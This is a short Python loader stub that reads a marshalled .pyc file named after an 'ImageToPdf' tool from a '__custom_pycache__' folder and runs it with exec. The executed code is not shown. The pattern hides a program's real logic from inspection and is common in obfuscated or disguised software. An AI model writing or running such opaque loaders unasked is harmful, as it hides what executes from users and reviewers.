
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'ImageToPdf_ded080b7377a4c8e9f9981d507b84d37.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
